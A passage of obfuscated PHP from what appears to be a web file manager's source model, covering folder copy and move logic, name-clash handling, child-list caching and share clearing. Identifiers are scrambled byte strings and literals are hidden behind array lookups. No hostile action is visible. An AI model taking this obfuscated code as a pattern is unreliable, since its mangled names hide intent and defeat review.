$¼­Ùâ¥¯); $¢Û…Ÿ‹Ñ = $this->_copyCreate($õÇ”ÀğØ, $š¸—Ö¤Ö, $“°²ê³â, $ÑıĞ¾¨); } else { $®ƒ­Ôú = $this->_childrenList($õÇ”ÀğØ); foreach ($®ƒ­Ôú as $¢”ŞÈşã) { $this->_copy($¢”ŞÈşã[$³ñ·íÄ[411]], $‘éÎÍ, $·®¹±û€, $ÑıĞ¾¨, !1); } } } else { if ($·®¹±û€ == REPEAT_RENAME || $·®¹±û€ == REPEAT_RENAME_FOLDER) { $“°²ê³â = $this->fileNameAutoCache($š¸—Ö¤Ö, $“°²ê³â, $·®¹±û€, $¼­Ùâ¥¯); $¢Û…Ÿ‹Ñ = $this->_copyCreate($õÇ”ÀğØ, $š¸—Ö¤Ö, $“°²ê³â, $ÑıĞ¾¨); } else { if ($·®¹±û€ == REPEAT_REPLACE) { $ŸÚÓµÁ˜ = $this->sourceInfoCache($‘éÎÍ); $ÍÕ¾·œ“ = $this->fileHistory($ŸÚÓµÁ˜, $Ğ›’Æ„[$³ñ·íÄ[477]], $Ğ›’Æ„[$³ñ·íÄ[76]]); if ($ÍÕ¾·œ“) { $ÑıĞ¾¨[$³ñ·íÄ[575]][] = $Ğ›’Æ„[$³ñ·íÄ[477]]; } } else { if ($·®¹±û€ == REPEAT_SKIP) { } } } Hook::trigger($³ñ·íÄ[580], array($³ñ·íÄ[581], $Ğ›’Æ„, 0)); } return $¢Û…Ÿ‹Ñ; } private function _copyCreate($†Çş¿›Å, $çÆ¾¸ë, $Ã‘‘óè, &$µÉ‹ëÁ) { $ƒ­¾¢òÔ =& $_SERVER[ĞÆÏ¡Îª]; $³ªŞƒ¸“ = $this->sourceInfoCache($†Çş¿›Å); $À§¼„¿« = $this->sourceInfoCache($çÆ¾¸ë); $éÈìÆÍ­ = $this->_makeItemData($³ªŞƒ¸“, $À§¼„¿«, $Ã‘‘óè); Hook::trigger($ƒ­¾¢òÔ[582], $éÈìÆÍ­); Hook::trigger($ƒ­¾¢òÔ[583], array($ƒ­¾¢òÔ[584], $éÈìÆÍ­, 0)); $°¿à“ı = $this->add($éÈìÆÍ­); $è´Şêß = array($ƒ­¾¢òÔ[411] => $°¿à“ı, $ƒ­¾¢òÔ[32] => $Ã‘‘óè); $this->_copyApplyMeta($è´Şêß, $µÉ‹ëÁ); if ($³ªŞƒ¸“[$ƒ­¾¢òÔ[419]] != $ƒ­¾¢òÔ[88]) { $µÉ‹ëÁ[$ƒ­¾¢òÔ[575]][] = $³ªŞƒ¸“[$ƒ­¾¢òÔ[477]]; return $°¿à“ı; } $®¨·„µì = array(); $Í¨ì†­ = array(); $this->_childrenListAll($†Çş¿›Å, $®¨·„µì); $Ñšì½± = count($®¨·„µì); if ($Ñšì½± == 0) { return $°¿à“ı; } $ÊÒËÕŞÅ = $this->sourceInfo($°¿à“ı); foreach ($®¨·„µì as $Ïø¥ù„É) { $ËÊÉ§Ÿ = $this->_makeItemData($Ïø¥ù„É, $ÊÒËÕŞÅ, $Ïø¥ù„É[$ƒ­¾¢òÔ[32]]); $ËÊÉ§Ÿ[$ƒ­¾¢òÔ[530]] = $Ïø¥ù„É[$ƒ­¾¢òÔ[530]]; $Í¨ì†­[] = $ËÊÉ§Ÿ; } $this->chunkEventSet($ƒ­¾¢òÔ[585], array($ƒ­¾¢òÔ[586], $éÈìÆÍ­, $Ñšì½±)); $this->addAll($Í¨ì†­, array(), !1); $ì•‰¨â = $this->where(array($ƒ­¾¢òÔ[441] => $°¿à“ı))->select(); $ÂåÌ‘‡ñ = $this->_childrenMakeRelation($®¨·„µì, $ì•‰¨â); $ÂåÌ‘‡ñ[$†Çş¿›Å] = $°¿à“ı; $‹¹ø‹©§ = array(); $ÁÅ¾Ó¹ = array(); foreach ($ì•‰¨â as $Ïø¥ù„É) { $ÔêÊïêİ = $Ïø¥ù„É[$ƒ­¾¢òÔ[411]]; $üĞ­Æ¢ï = $this->_childrenMatch($ÂåÌ‘‡ñ, $Ïø¥ù„É, $ÊÒËÕŞÅ); $‹¹ø‹©§[] = array($ƒ­¾¢òÔ[411], $ÔêÊïêİ, $ƒ­¾¢òÔ[441], $üĞ­Æ¢ï[$ƒ­¾¢òÔ[441]]); $ÁÅ¾Ó¹[] = array($ƒ­¾¢òÔ[411], $ÔêÊïêİ, $ƒ­¾¢òÔ[530], $üĞ­Æ¢ï[$ƒ­¾¢òÔ[530]]); $this->_copyApplyMeta($Ïø¥ù„É, $µÉ‹ëÁ); if ($Ïø¥ù„É[$ƒ­¾¢òÔ[419]] != $ƒ­¾¢òÔ[88]) { $µÉ‹ëÁ[$ƒ­¾¢òÔ[575]][] = $Ïø¥ù„É[$ƒ­¾¢òÔ[477]]; } } $this->chunkEventSet($ƒ­¾¢òÔ[587], array($ƒ­¾¢òÔ[588], $éÈìÆÍ­, $Ñšì½±)); $this->saveAll($‹¹ø‹©§); $this->chunkEventSet($ƒ­¾¢òÔ[589], array($ƒ­¾¢òÔ[590], $éÈìÆÍ­, $Ñšì½±)); $this->saveAll($ÁÅ¾Ó¹); return $°¿à“ı; } private function _childrenMakeRelation($ü¢ğÑ, $¢½Öãşä) { $ã¡Ğ¼Õ =& $_SERVER[ĞÆÏ¡Îª]; $°¦‹Ì€Ü = array(); $â»èÌßİ = array(); foreach ($ü¢ğÑ as $¬µ‚º¢Ü) { $÷Íéà¾î = $¬µ‚º¢Ü[$ã¡Ğ¼Õ[32]] . $ã¡Ğ¼Õ[8] . $¬µ‚º¢Ü[$ã¡Ğ¼Õ[530]]; $°¦‹Ì€Ü[$÷Íéà¾î] = $¬µ‚º¢Ü[$ã¡Ğ¼Õ[411]]; } foreach ($¢½Öãşä as $¬µ‚º¢Ü) { $÷Íéà¾î = $¬µ‚º¢Ü[$ã¡Ğ¼Õ[32]] . $ã¡Ğ¼Õ[8] . $¬µ‚º¢Ü[$ã¡Ğ¼Õ[530]]; $Ÿùì¿ˆÚ = $°¦‹Ì€Ü[$÷Íéà¾î]; $â»èÌßİ[$Ÿùì¿ˆÚ] = $¬µ‚º¢Ü[$ã¡Ğ¼Õ[411]]; } return $â»èÌßİ; } private function _childrenMatch($Íìê¡óØ, $é°¶Ø–Ğ, $‘ Ÿ€±ö) { $ÊèœöÑÍ =& $_SERVER[ĞÆÏ¡Îª]; $“°í·¾¼ = $‘ Ÿ€±ö[$ÊèœöÑÍ[530]]; $˜Û’À›“ = $this->parentLevelArray($é°¶Ø–Ğ[$ÊèœöÑÍ[530]]); foreach ($˜Û’À›“ as $¥º¨”³Œ) { if (isset($Íìê¡óØ[$¥º¨”³Œ])) { $“°í·¾¼ .= $Íìê¡óØ[$¥º¨”³Œ] . $ÊèœöÑÍ[591]; } } $“°í·¾¼ = rtrim($“°í·¾¼, $ÊèœöÑÍ[50]) . $ÊèœöÑÍ[50]; $ÎŒšÀàÈ = $this->parentLevelArray($“°í·¾¼); $•¸†¢Í = $ÎŒšÀàÈ[count($ÎŒšÀàÈ) - 1]; return array($ÊèœöÑÍ[441] => $•¸†¢Í, $ÊèœöÑÍ[530] => $“°í·¾¼); } private function _makeItemData($×Ë¼—«˜, $ÂšŒ„ëš, $ôñß–È) { $©¹œƒÇõ =& $_SERVER[ĞÆÏ¡Îª]; $‘Ì›³¥ = array($©¹œƒÇõ[592] => $×Ë¼—«˜[$©¹œƒÇõ[419]], $©¹œƒÇõ[429] => $ôñß–È, $©¹œƒÇõ[593] => $×Ë¼—«˜[$©¹œƒÇõ[421]] ? $×Ë¼—«˜[$©¹œƒÇõ[421]] : $©¹œƒÇõ[12], $©¹œƒÇõ[478] => $×Ë¼—«˜[$©¹œƒÇõ[477]] ? $×Ë¼—«˜[$©¹œƒÇõ[477]] : 0, $©¹œƒÇõ[594] => $×Ë¼—«˜[$©¹œƒÇõ[76]] ? $×Ë¼—«˜[$©¹œƒÇõ[76]] : 0, $©¹œƒÇõ[595] => intval($ÂšŒ„ëš[$©¹œƒÇõ[420]]), $©¹œƒÇõ[596] => intval($ÂšŒ„ëš[$©¹œƒÇõ[514]]), $©¹œƒÇõ[597] => intval(USER_ID), $©¹œƒÇõ[598] => intval(USER_ID), $©¹œƒÇõ[410] => intval($ÂšŒ„ëš[$©¹œƒÇõ[411]]), $©¹œƒÇõ[599] => $ÂšŒ„ëš[$©¹œƒÇõ[530]] . $ÂšŒ„ëš[$©¹œƒÇõ[411]] . $©¹œƒÇõ[50], $©¹œƒÇõ[433] => $×Ë¼—«˜[$©¹œƒÇõ[85]] ? $×Ë¼—«˜[$©¹œƒÇõ[85]] : time(), $©¹œƒÇõ[439] => 0, $©¹œƒÇõ[600] => $©¹œƒÇõ[12]); return $‘Ì›³¥; } private function _copyApplyMeta($×«şó”á, &$ùë¾”‡) { $ÜÔŞşö =& $_SERVER[ĞÆÏ¡Îª]; $÷ù‹¶Ÿ = $×«şó”á[$ÜÔŞşö[411]]; $¡™Ø€òï = $×«şó”á[$ÜÔŞşö[32]]; if (!isset($×«şó”á[$ÜÔŞşö[601]]) || !$×«şó”á[$ÜÔŞşö[601]] || $×«şó”á[$ÜÔŞşö[601]] == $ÜÔŞşö[197]) { $ùë¾”‡[$ÜÔŞşö[577]][] = array($ÜÔŞşö[411], $÷ù‹¶Ÿ, $ÜÔŞşö[601], short_id($÷ù‹¶Ÿ)); } if (Input::check($¡™Ø€òï, $ÜÔŞşö[602])) { $ùë¾”‡[$ÜÔŞşö[576]][] = array($ÜÔŞşö[411] => $÷ù‹¶Ÿ, $ÜÔŞşö[94] => $ÜÔŞşö[474], $ÜÔŞşö[383] => str_replace($ÜÔŞşö[53], $ÜÔŞşö[12], Pinyin::get($¡™Ø€òï))); $ùë¾”‡[$ÜÔŞşö[576]][] = array($ÜÔŞşö[411] => $÷ù‹¶Ÿ, $ÜÔŞşö[94] => $ÜÔŞşö[473], $ÜÔŞşö[383] => Pinyin::get($¡™Ø€òï, $ÜÔŞşö[603])); } $ùë¾”‡[$ÜÔŞşö[576]][] = array($ÜÔŞşö[411] => $÷ù‹¶Ÿ, $ÜÔŞşö[94] => $ÜÔŞşö[453], $ÜÔŞşö[383] => KodSort::makeStr($¡™Ø€òï)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Üµı²æ¡) { $ƒ®Æ½„ =& $_SERVER[ĞÆÏ¡Îª]; $é¯Á—±ë = $this->sourceInfo($Üµı²æ¡); $ŸÁøò·‹ = $ƒ®Æ½„[604]; $Ô™†±¯ = array($ƒ®Æ½„[530] => array($ƒ®Æ½„[559], $é¯Á—±ë[$ƒ®Æ½„[530]] . $Üµı²æ¡ . $ƒ®Æ½„[560]), $ƒ®Æ½„[440] => $this->targetIsDelete); $œø‘µ±¿ = $this->field($ŸÁøò·‹)->where($Ô™†±¯)->select(); if (!$œø‘µ±¿) { return; } $œø‘µ±¿ = array_to_keyvalue($œø‘µ±¿, $ƒ®Æ½„[411]); foreach ($œø‘µ±¿ as $½ñêĞï­) { $Êì½ìá = $½ñêĞï­[$ƒ®Æ½„[441]]; $Üµı²æ¡ = $½ñêĞï­[$ƒ®Æ½„[411]]; if (!isset($this->_childrenListCache[$Üµı²æ¡]) && $½ñêĞï­[$ƒ®Æ½„[419]] == $ƒ®Æ½„[88]) { $this->_childrenListCache[$Üµı²æ¡] = array(); } if (!isset($this->_childrenListCache[$Êì½ìá])) { $this->_childrenListCache[$Êì½ìá] = array(); } $this->_childrenListCache[$Êì½ìá][$Üµı²æ¡] = $½ñêĞï­; $this->_childrenItemCache[$Üµı²æ¡] = $½ñêĞï­; } } private function _childrenListAll($»ıâ•¼ğ, &$ûŞ¿ğ¯‰) { $¾“—âğ© =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->_childrenListCache[$»ıâ•¼ğ])) { return; } $¨“ŠÕ–« = $this->_childrenListCache[$»ıâ•¼ğ]; foreach ($¨“ŠÕ–« as $¢®‹½ò‚ => $«Î”ï¥ú) { $ûŞ¿ğ¯‰[$¢®‹½ò‚] = $«Î”ï¥ú; if ($«Î”ï¥ú[$¾“—âğ©[419]] == $¾“—âğ©[88]) { $this->_childrenListAll($¢®‹½ò‚, $ûŞ¿ğ¯‰); } } } private function sourceInfoCache($ìÚÑÍŞá) { if (isset($this->_childrenItemCache[$ìÚÑÍŞá])) { return $this->_childrenItemCache[$ìÚÑÍŞá]; } return $this->sourceInfo($ìÚÑÍŞá); } private function _childrenList($ÊŒ×ƒ¦İ) { if (isset($this->_childrenListCache[$ÊŒ×ƒ¦İ])) { return $this->_childrenListCache[$ÊŒ×ƒ¦İ]; } return $this->_childrenListSelect($ÊŒ×ƒ¦İ); } private function _childrenListSelect($ƒ™Ğ×Å) { $Ê”­Ó€½ =& $_SERVER[ĞÆÏ¡Îª]; $Ã×ß´Ó¿ = array($Ê”­Ó€½[441] => $ƒ™Ğ×Å, $Ê”­Ó€½[440] => $this->targetIsDelete); $°œÉŒŸ² = $this->where($Ã×ß´Ó¿)->select(); $°œÉŒŸ² = $°œÉŒŸ² ? $°œÉŒŸ² : array(); $æû÷¢ = array_to_keyvalue($°œÉŒŸ², $Ê”­Ó€½[411]); $this->_childrenListCache[$ƒ™Ğ×Å] = $æû÷¢; foreach ($æû÷¢ as $ƒ™Ğ×Å => $“®÷ùØ•) { $this->_childrenItemCache[$ƒ™Ğ×Å] = $“®÷ùØ•; } return $æû÷¢; } private function fileNameExistCache($Ñ¼¢‚õ—, $Äü½Õ€æ) { $÷êà¢Ù× =& $_SERVER[ĞÆÏ¡Îª]; $Äü½Õ€æ = strtolower($Äü½Õ€æ); $â—Èªêé = $this->_childrenList($Ñ¼¢‚õ—); foreach ($â—Èªêé as $ï´î•œ) { if ($Äü½Õ€æ == strtolower($ï´î•œ[$÷êà¢Ù×[32]])) { return $ï´î•œ[$÷êà¢Ù×[411]]; } } return !1; } private function fileNameAutoCache($ÜËô’ÒŞ, $çì·ßÀÒ, $ÉŸô›Êõ, $¥ïêû·†) { $ù×³úº· =& $_SERVER[ĞÆÏ¡Îª]; $åÜæ´ìÆ = $this->_childrenList($ÜËô’ÒŞ); $Š¡¦è¢€ = array_to_keyvalue($åÜæ´ìÆ, $ù×³úº·[12], $ù×³úº·[32]); return $this->fileNameAutoGet($Š¡¦è¢€, $çì·ßÀÒ, $ÉŸô›Êõ, $¥ïêû·†); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($™é¸ı, $âí¯ûş•, $·–…‡´ = REPEAT_REPLACE, $Ôú¾äÛõ = '') { $»ô©ÈÉ¹ =& $_SERVER[ĞÆÏ¡Îª]; $ÕÜ­²ÑŒ = $this->sourceInfo($™é¸ı); $ áëµ²‰ = $this->sourceInfo($âí¯ûş•); if ($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[441]] == $ áëµ²‰[$»ô©ÈÉ¹[411]]) { if ($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[440]] == $»ô©ÈÉ¹[88]) { Model($»ô©ÈÉ¹[438])->restore(array($™é¸ı)); } if (!$Ôú¾äÛõ || $Ôú¾äÛõ == $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[32]]) { return $™é¸ı; } } $“‡”Şˆ = $this->pathInfoMore($™é¸ı); if ($this->isParentOf($™é¸ı, $âí¯ûş•)) { return !1; } if (!$ÕÜ­²ÑŒ || !$ áëµ²‰ || $ áëµ²‰[$»ô©ÈÉ¹[419]] != $»ô©ÈÉ¹[88]) { return !1; } Hook::trigger($»ô©ÈÉ¹[605], $“‡”Şˆ); $this->targetIsDelete = intval($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[440]]); if ($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[441]] == $âí¯ûş• && $Ôú¾äÛõ != $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[32]]) { $îª²€ò = $this->fileNameExist($âí¯ûş•, $Ôú¾äÛõ); if ($îª²€ò && $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[419]] == $»ô©ÈÉ¹[197]) { $¿¦Æ£û” = $this->sourceInfo($îª²€ò); $º£øò‚§ = $this->fileHistory($¿¦Æ£û”, $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[477]], $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[76]]); if (!$º£øò‚§) { Model($»ô©ÈÉ¹[480])->remove($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[477]]); } $this->removeNow($™é¸ı, !1); $this->folderSizeReset($âí¯ûş•); Hook::trigger($»ô©ÈÉ¹[606], $“‡”Şˆ); return $îª²€ò; } } $æøÎä±™ = $Ôú¾äÛõ ? $Ôú¾äÛõ : $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[32]]; $this->lockMoveStart($™é¸ı); $this->lockWriteStart($âí¯ûş•, $æøÎä±™); $¢ÏèªÇÁ = array($»ô©ÈÉ¹[575] => array(), $»ô©ÈÉ¹[607] => !1); $this->clearShare($™é¸ı, $âí¯ûş•); $ùíÏŸÊ¹ = $this->fileNameExistCache($âí¯ûş•, $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[32]]); $ÜÌùŞØŒ = $this->_move($™é¸ı, $âí¯ûş•, $·–…‡´, $¢ÏèªÇÁ, $Ôú¾äÛõ); $this->sourceCacheClear(); if ($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[419]] == $»ô©ÈÉ¹[88] && $ùíÏŸÊ¹) { $this->folderSizeResetChildren($ÜÌùŞØŒ); } Model($»ô©ÈÉ¹[199])->linkAdd($¢ÏèªÇÁ[$»ô©ÈÉ¹[575]]); if ($ùíÏŸÊ¹ && $¢ÏèªÇÁ[$»ô©ÈÉ¹[607]]) { $this->removeNow($™é¸ı, !1); } $this->lockMoveEnd($™é¸ı); $this->lockWriteEnd($âí¯ûş•, $æøÎä±™); $this->folderSizeReset($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[441]]); $this->folderSizeReset($âí¯ûş•); $÷¥Åâˆú = array($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[441]], $âí¯ûş•); if ($ÕÜ­²ÑŒ[$»ô©ÈÉ¹[419]] == $»ô©ÈÉ¹[88]) { $÷¥Åâˆú[] = $™é¸ı; } $this->updateModifyTime($÷¥Åâˆú); Model($»ô©ÈÉ¹[579])->eventMove($™é¸ı, $ÕÜ­²ÑŒ[$»ô©ÈÉ¹[441]], $âí¯ûş•); Hook::trigger($»ô©ÈÉ¹[606], $“‡”Şˆ); return $ÜÌùŞØŒ; } private function _move($ÌÕÚ‹•Í, $Œæ‹Ğ´¥, $·æÕŞÏñ, &$ï–Áää», $–¡ÍÀŠ = '') { $†é›ÔÖ =& $_SERVER[ĞÆÏ¡Îª]; $‚Œ¦ ˜Å = $this->sourceInfo($ÌÕÚ‹•Í); $¥‘Œº‰ = $‚Œ¦ ˜Å[$†é›ÔÖ[419]] == $†é›ÔÖ[88]; $ğ²ùÉ”· = $–¡ÍÀŠ ? $–¡ÍÀŠ : $‚Œ¦ ˜Å[$†é›ÔÖ[32]]; $ğú´Œç = $this->fileNameExistCache($Œæ‹Ğ´¥, $ğ²ùÉ”·); $this->lockMoveStart($ÌÕÚ‹•Í); $this->lockWriteStart($Œæ‹Ğ´¥, $ğ²ùÉ”·); if (!$ğú´Œç) { return $this->_moveForce($ÌÕÚ‹•Í, $Œæ‹Ğ´¥, $ğ²ùÉ”·); } $§ÙİğÚû = $ğú´Œç; $î£œ€Îï = !1; if ($¥‘Œº‰) { if ($·æÕŞÏñ == REPEAT_RENAME_FOLDER) { $ğ²ùÉ”· = $this->fileNameAuto($Œæ‹Ğ´¥, $ğ²ùÉ”·, $·æÕŞÏñ, $¥‘Œº‰); $§ÙİğÚû = $this->_moveForce($ÌÕÚ‹•Í, $Œæ‹Ğ´¥, $ğ²ùÉ”·); } else { if ($·æÕŞÏñ == REPEAT_RENAME_FOLDER) { $·æÕŞÏñ = REPEAT_RENAME; } $±Ş‘õ¼¨ = $this->_childrenListSelect($ÌÕÚ‹•Í); foreach ($±Ş‘õ¼¨ as $Ê¨Ç½¸Š) { $this->_move($Ê¨Ç½¸Š[$†é›ÔÖ[411]], $ğú´Œç, $·æÕŞÏñ, $ï–Áää»); } $î£œ€Îï = !0; } } else { if ($·æÕŞÏñ == REPEAT_SKIP) { $î£œ€Îï = !0; } else { if ($·æÕŞÏñ == REPEAT_RENAME || $·æÕŞÏñ == REPEAT_RENAME_FOLDER) { $ğ²ùÉ”· = $this->fileNameAuto($Œæ‹Ğ´¥, $ğ²ùÉ”·, $·æÕŞÏñ, $¥‘Œº‰); $§ÙİğÚû = $this->_moveForce($ÌÕÚ‹•Í, $Œæ‹Ğ´¥, $ğ²ùÉ”·); } else { if ($·æÕŞÏñ == REPEAT_REPLACE) { $ê¥ĞœÑÄ = $this->sourceInfoCache($ğú´Œç); $›î™Ö±© = $this->fileHistory($ê¥ĞœÑÄ, $‚Œ¦ ˜Å[$†é›ÔÖ[477]], $‚Œ¦ ˜Å[$†é›ÔÖ[76]]); $î£œ€Îï = !0; if ($›î™Ö±©) { $ï–Áää»[$†é›ÔÖ[575]][] = $‚Œ¦ ˜Å[$†é›ÔÖ[477]]; } } } } } if ($î£œ€Îï && !$ï–Áää»[$†é›ÔÖ[607]]) { $ï–Áää»[$†é›ÔÖ[607]] = !0; } return $§ÙİğÚû; } private function _moveForce($¿ï†î³¡, $´±ì©ÕÔ, $Åü„¼³Ù) { $ßË†æ½ =& $_SERVER[ĞÆÏ¡Îª]; $ŞÇ¥ò£İ = $this->sourceInfo($¿ï†î³¡); $°¼ïáà† = $this->sourceInfo($´±ì©ÕÔ); $‡ÕÊµë = $ŞÇ¥ò£İ[$ßË†æ½[419]] == $ßË†æ½[88]; $À°û° = array($ßË†æ½[410] => $°¼ïáà†[$ßË†æ½[411]], $ßË†æ½[599] => $°¼ïáà†[$ßË†æ½[530]] . $°¼ïáà†[$ßË†æ½[411]] . $ßË†æ½[50], $ßË†æ½[595] => $°¼ïáà†[$ßË†æ½[420]], $ßË†æ½[596] => $°¼ïáà†[$ßË†æ½[514]], $ßË†æ½[598] => USER_ID, $ßË†æ½[429] => $Åü„¼³Ù); $Ô®İëöµ = $ŞÇ¥ò£İ[$ßË†æ½[420]] == SourceModel::TYPE_GROUP && $°¼ïáà†[$ßË†æ½[420]] == SourceModel::TYPE_GROUP && $ŞÇ¥ò£İ[$ßË†æ½[514]] == $°¼ïáà†[$ßË†æ½[514]]; if (!$Ô®İëöµ && $this->moveClearAuth) { Model($ßË†æ½[511])->authClear($¿ï†î³¡); } $ş¿ÁËş¿ = $ŞÇ¥ò£İ[$ßË†æ½[440]] == $ßË†æ½[88] && $°¼ïáà†[$ßË†æ½[440]] != $ßË†æ½[88]; if ($ş¿ÁËş¿) { $À°û°[$ßË†æ½[439]] = 0; } if ($‡ÕÊµë) { $“¢àşô = array($ßË†æ½[599] => array($ßË†æ½[559], $ŞÇ¥ò£İ[$ßË†æ½[530]] . $ŞÇ¥ò£İ[$ßË†æ½[411]] . $ßË†æ½[560])); $¤ïÏ»Áà = $ŞÇ¥ò£İ[$ßË†æ½[530]] . $ŞÇ¥ò£İ[$ßË†æ½[411]] . $ßË†æ½[50]; $üôƒçªÙ = $°¼ïáà†[$ßË†æ½[530]] . $°¼ïáà†[$ßË†æ½[411]] . $ßË†æ½[50] . $ŞÇ¥ò£İ[$ßË†æ½[411]] . $ßË†æ½[50]; $—æÃşö… = array($ßË†æ½[599] => array($ßË†æ½[608], "\x72\145\160\154\x61\x63\145\x28\160\x61\162\145\x6e\x74\x4c\x65\166\x65\154\x2c\x27{$¤ïÏ»Áà}\47\54\47{$üôƒçªÙ}\47\51"), $ßË†æ½[595] => $°¼ïáà†[$ßË†æ½[420]], $ßË†æ½[596] => $°¼ïáà†[$ßË†æ½[514]]); if ($ş¿ÁËş¿) { $—æÃşö…[$ßË†æ½[439]] = 0; } $this->where($“¢àşô)->data($—æÃşö…)->save(); } $this->where(array($ßË†æ½[426] => $¿ï†î³¡))->data($À°û°)->save(); return $¿ï†î³¡; } private function clearShare($²ŠÎäï, $ÉğËÔ¡) { $“§¿³¡ó =& $_SERVER[ĞÆÏ¡Îª]; $şá‚¡ = $this->sourceInfo($²ŠÎäï); $æœ¡†’ = $this->sourceInfo($ÉğËÔ¡); if ($şá‚¡[$“§¿³¡ó[514]] == $æœ¡†’[$“§¿³¡ó[514]] && $şá‚¡[$“§¿³¡ó[420]] == $“§¿³¡ó[609]) { return; } $Ú¦½““ = array($“§¿³¡ó[530] => array($“§¿³¡ó[559], $şá‚¡[$“§¿³¡ó[530]] . $²ŠÎäï . $“§¿³¡ó[560])); $ˆ§¸¸²÷ = $this->field($“§¿³¡ó[426])->where($Ú¦½““)->getField($“§¿³¡ó[411], !0); if (!$ˆ§¸¸²÷) { return; } $Ú¦½““ = array($“§¿³¡ó[411] => array($“§¿³¡ó[7], $ˆ§¸¸²÷), $“§¿³¡ó[505] => 1); $Ä›ìÙ«Ğ = Model($“§¿³¡ó[610])->field($“§¿³¡ó[498])->where($Ú¦½““)->select(); if (!$Ä›ìÙ«Ğ) { return; } $Ä›ìÙ«Ğ = array_to_keyvalue($Ä›ìÙ«Ğ, $“§¿³¡ó[12], $“§¿³¡ó[498]); $Ú¦½““ = array($“§¿³¡ó[498] => array($“§¿³¡ó[7], $Ä›ìÙ«Ğ)); Model($“§¿³¡ó[610])->where($Ú¦½““)->save(array($“§¿³¡ó[505] => 0)); Model($“§¿³¡ó[611])->where($Ú¦½““)->delete(); } public function copyFolderFromIO($‰‚«òÛÙ, $ÆãëéèŠ, $¢’™ôƒå, $ê¨êÊÙÎ, $Î­³½¢ˆ, $–¾Ş„§ = false) { $¸Ëñï€ï =& $_SERVER[ĞÆÏ¡Îª]; $¿Äö¶üà = array($¸Ëñï€ï[576] => array(), $¸Ëñï€ï[577] => array(), $¸Ëñï€ï[575] => array(), $¸Ëñï€ï[612] => array()); $ˆËÊ…±õ = $–¾Ş„§ ? $–¾Ş„§ : $‰‚«òÛÙ->pathThis($ÆãëéèŠ); $¯øøÕ­ì = $this->fileNameExist($¢’™ôƒå, $ˆËÊ…±õ); $ ¥ú»Ñ = $this->mkdir($¢’™ôƒå, $ˆËÊ…±õ, $ê¨êÊÙÎ); if (!$¯øøÕ­ì || $ê¨êÊÙÎ == REPEAT_RENAME_FOLDER) { $ê¨êÊÙÎ = !1; } if ($¯øøÕ­ì) { $this->_childrenAllMake($¯øøÕ­ì); } Hook::trigger($¸Ëñï€ï[613]); $this->_copyChildTo($‰‚«òÛÙ, $ÆãëéèŠ, $ ¥ú»Ñ, $ê¨êÊÙÎ, $¿Äö¶üà, $Î­³½¢ˆ); Hook::trigger($¸Ëñï€ï[614]); if ($ ¥ú»Ñ) { $this->folderSizeResetChildren($ ¥ú»Ñ); } $this->_childrenListClear(); Model($¸Ëñï€ï[578])->addAll($¿Äö¶üà[$¸Ëñï€ï[576]], array(), !0); Model($¸Ëñï€ï[579])->eventCopy($ ¥ú»Ñ); $this->saveAll($¿Äö¶üà[$¸Ëñï€ï[577]]); Model($¸Ëñï€ï[480])->linkAdd($¿Äö¶üà[$¸Ëñï€ï[575]]); Model($¸Ëñï€ï[480])->remove($¿Äö¶üà[$¸Ëñï€ï[612]]); $this->folderSizeReset($¢’™ôƒå); $this->updateModifyTime($¢’™ôƒå); return $ ¥ú»Ñ; } private function _copyChildTo($î±³‡¥‚, $Ş»£¾±Ê, $İ“²ÊşË, $çØßûÑ, &$üĞÕûÑÍ, $ìùïûæû) { $µ†­ó‰¡ =& $_SERVER[ĞÆÏ¡Îª]; $ÓˆãŒª = $this->sourceInfoCache($İ“²ÊşË); $çüÕ­¤İ = $î±³‡¥‚->listPath($Ş»£¾±Ê); $çüÕ­¤İ = $çüÕ­¤İ ? $çüÕ­¤İ : array($µ†­ó‰¡[83] => array(), $µ†­ó‰¡[82] => array()); $Â‹‰¨ÅÃ = array_merge($çüÕ­¤İ[$µ†­ó‰¡[83]], $çüÕ­¤İ[$µ†­ó‰¡[82]]); $Ï×œ Í¯ = $this->_addFiles($î±³‡¥‚, $çüÕ­¤İ[$µ†­ó‰¡[83]], $ìùïûæû); $êÊôÅÓæ = array(); foreach ($Â‹‰¨ÅÃ as &$ìÖ¬®²€) { if (isset($Ï×œ Í¯[$ìÖ¬®²€[$µ†­ó‰¡[32]]])) { $ìÖ¬®²€ = $Ï×œ Í¯[$ìÖ¬®²€[$µ†­ó‰¡[32]]]; } $ìÖ¬®²€[$µ†­ó‰¡[419]] = $ìÖ¬®²€[$µ†­ó‰¡[33]] == $µ†­ó‰¡[75]; $ìÖ¬®²€[$µ†­ó‰¡[421]] = substr(_get($ìÖ¬®²€, $µ†­ó‰¡[174], $µ†­ó‰¡[12]), 0, 10); $ìÖ¬®²€[$µ†­ó‰¡[76]] = _get($ìÖ¬®²€, $µ†­ó‰¡[76], 0); $ìÖ¬®²€[$µ†­ó‰¡[477]] = _get($ìÖ¬®²€, $µ†­ó‰¡[477], 0); if (!isset($ìÖ¬®²€[$µ†­ó‰¡[615]]) && $ìÖ¬®²€[$µ†­ó‰¡[477]]) { $üĞÕûÑÍ[$µ†­ó‰¡[612]][] = $ìÖ¬®²€[$µ†­ó‰¡[477]]; } if ($çØßûÑ) { $æ¶â¿… = $this->fileNameExistCache($İ“²ÊşË, $ìÖ¬®²€[$µ†­ó‰¡[32]]); if ($æ¶â¿…) { if ($ìÖ¬®²€[$µ†­ó‰¡[419]] || $çØßûÑ == REPEAT_SKIP) { continue; } if ($çØßûÑ == REPEAT_REPLACE) { $Â­ÍÍ¸è = $this->sourceInfoCache($æ¶â¿…); $ëüÜøöĞ = 